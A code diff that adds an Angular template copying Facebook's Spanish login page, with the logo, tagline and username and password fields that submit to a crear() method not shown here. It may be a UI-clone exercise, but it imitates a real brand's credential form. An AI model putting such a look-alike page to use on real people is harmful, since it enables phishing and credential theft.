@@ -1,0 +1,21 @@
+<div class="container">
+    <div class="container-profile">
+        <span class="logo">
+            <img src="/assets/images/1.svg" alt="facebook">
+        </span>
+        <p class="connect-friends">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+    </div>
+    <div class="container-form">
+        <form class="form" (ngSubmit)="crear()">
+            <input type="text" placeholder="Correo electronico o numero de telefono" name="user" [(ngModel)]="usuario.user">
+            <input type="password" placeholder="Contraseña" name="password" [(ngModel)]="usuario.password">
+            <button class="input" (click)="crear()">Iniciar Sesión</button>
+            <span><a href="#">¿Olvidaste tu contraseña?</a></span>
+            <div class="border"></div>
+            <button class="nueva" ><a href="#">Crear cuenta nueva</a></button>
+        </form>
+        <p class="create-page">
+            <a href="#">Crear una pagina</a> para una celebridad , una marca o un <br> neogocio.
+        </p>
+    </div>
+</div>
